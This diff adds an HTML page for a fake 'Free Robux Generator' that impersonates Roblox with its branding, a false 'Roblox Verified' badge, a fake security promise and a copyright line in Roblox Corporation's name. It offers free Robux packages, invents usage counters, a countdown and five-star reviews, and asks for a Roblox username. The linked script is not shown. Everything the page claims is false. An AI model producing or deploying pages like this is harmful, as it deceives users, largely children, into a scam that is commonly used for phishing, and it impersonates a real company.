@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Free Robux Generator</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <header class="roblox-header">
+        <div class="header-container">
+            <div class="roblox-logo">
+                <i class="fas fa-cube"></i>
+                <span>Roblox</span>
+            </div>
+            <nav class="main-nav">
+                <a href="#" class="nav-link">DISCOVER</a>
+                <a href="#" class="nav-link">MARKETPLACE</a>
+                <a href="#" class="nav-link">CREATE</a>
+                <a href="#" class="nav-link active">ROBUX</a>
+                <a href="#" class="nav-link">GROUPS</a>
+            </nav>
+            <div class="user-area">
+                <div class="robux-balance">
+                    <i class="fas fa-coins"></i>
+                    <span>0 Robux</span>
+                </div>
+                <div class="user-info">
+                    <span>Guest</span>
+                    <i class="fas fa-user-circle"></i>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="roblox-body">
+        <div class="promo-banner">
+            <div class="banner-content">
+                <h1>FREE ROBUX GENERATOR 2025</h1>
+                <p>Get unlimited free Robux instantly!</p>
+                <div class="banner-stats">
+                    <div class="stat">
+                        <span class="stat-number" id="robux-generated">2,847,392</span>
+                        <span class="stat-label">Robux Generated</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number" id="time-left">23:45:30</span>
+                        <span class="stat-label">Offer Expires</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">47,829</span>
+                        <span class="stat-label">Active Users</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="main-container">
+            <div class="generator-section">
+                <div class="section-header">
+                    <h2>Free Robux Generator</h2>
+                    <div class="verified-badge">
+                        <i class="fas fa-shield-check"></i>
+                        <span>Roblox Verified</span>
+                    </div>
+                </div>
+
+                <div class="robux-packages">
+                    <div class="package-card" data-robux="1000">
+                        <div class="package-icon">
+                            <i class="fas fa-coins"></i>
+                        </div>
+                        <div class="package-info">
+                            <h3>1,000 Robux</h3>
+                            <div class="package-price">
+                                <span class="original-price">$9.99</span>
+                                <span class="free-price">FREE</span>
+                            </div>
+                            <div class="popularity">
+                                <span class="popularity-badge">Most Popular</span>
+                            </div>
+                            <button class="generate-btn" onclick="generateRobux('1000')">
+                                <i class="fas fa-magic"></i>
+                                GENERATE NOW
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="package-card" data-robux="2500">
+                        <div class="package-icon">
+                            <i class="fas fa-gem"></i>
+                        </div>
+                        <div class="package-info">
+                            <h3>2,500 Robux</h3>
+                            <div class="package-price">
+                                <span class="original-price">$24.99</span>
+                                <span class="free-price">FREE</span>
+                            </div>
+                            <div class="popularity">
+                                <span class="popularity-badge premium">Premium</span>
+                            </div>
+                            <button class="generate-btn" onclick="generateRobux('2500')">
+                                <i class="fas fa-magic"></i>
+                                GENERATE NOW
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="package-card" data-robux="5000">
+                        <div class="package-icon">
+                            <i class="fas fa-crown"></i>
+                        </div>
+                        <div class="package-info">
+                            <h3>5,000 Robux</h3>
+                            <div class="package-price">
+                                <span class="original-price">$49.99</span>
+                                <span class="free-price">FREE</span>
+                            </div>
+                            <div class="popularity">
+                                <span class="popularity-badge legendary">Legendary</span>
+                            </div>
+                            <button class="generate-btn" onclick="generateRobux('5000')">
+                                <i class="fas fa-magic"></i>
+                                GENERATE NOW
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="package-card" data-robux="10000">
+                        <div class="package-icon">
+                            <i class="fas fa-trophy"></i>
+                        </div>
+                        <div class="package-info">
+                            <h3>10,000 Robux</h3>
+                            <div class="package-price">
+                                <span class="original-price">$99.99</span>
+                                <span class="free-price">FREE</span>
+                            </div>
+                            <div class="popularity">
+                                <span class="popularity-badge ultimate">Ultimate</span>
+                            </div>
+                            <button class="generate-btn" onclick="generateRobux('10000')">
+                                <i class="fas fa-magic"></i>
+                                GENERATE NOW
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="generator-form">
+                    <h3>Enter Your Roblox Username</h3>
+                    <div class="form-group">
+                        <input type="text" id="username-input" placeholder="Your Roblox Username" class="username-input">
+                        <button class="verify-btn" onclick="verifyUsername()">
+                            <i class="fas fa-search"></i>
+                            VERIFY
+                        </button>
+                    </div>
+                    <div class="security-notice">
+                        <i class="fas fa-lock"></i>
+                        <span>Your account is protected by Roblox security protocols</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <div class="how-it-works">
+                    <h3>How It Works</h3>
+                    <div class="steps">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-text">Choose Robux amount</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-text">Enter username</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-text">Verify account</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">4</div>
+                            <div class="step-text">Receive free Robux</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="recent-generations">
+                    <h3>Recent Generations</h3>
+                    <div class="generation-list" id="generation-list">
+                        <div class="generation-item">
+                            <div class="user-avatar">
+                                <i class="fas fa-user-circle"></i>
+                            </div>
+                            <div class="generation-content">
+                                <div class="username">RobloxMaster123</div>
+                                <div class="amount">Generated 2,500 Robux</div>
+                                <div class="timestamp">2 minutes ago</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="testimonials">
+                    <h3>User Reviews</h3>
+                    <div class="testimonial">
+                        <div class="stars">⭐⭐⭐⭐⭐</div>
+                        <p>"This actually works! Got 5000 Robux in minutes!"</p>
+                        <div class="reviewer">- GameMaster2025</div>
+                    </div>
+                    <div class="testimonial">
+                        <div class="stars">⭐⭐⭐⭐⭐</div>
+                        <p>"Best free Robux generator ever. 100% legit!"</p>
+                        <div class="reviewer">- RobloxPro999</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="roblox-footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">About Us</a>
+                <a href="#">Help</a>
+                <a href="#">Terms</a>
+                <a href="#">Privacy</a>
+                <a href="#">Safety</a>
+                <a href="#">Investor Relations</a>
+            </div>
+            <div class="footer-text">
+                <p>&copy; 2025 Roblox Corporation. All rights reserved. Roblox and the Roblox logo are trademarks of Roblox Corporation.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
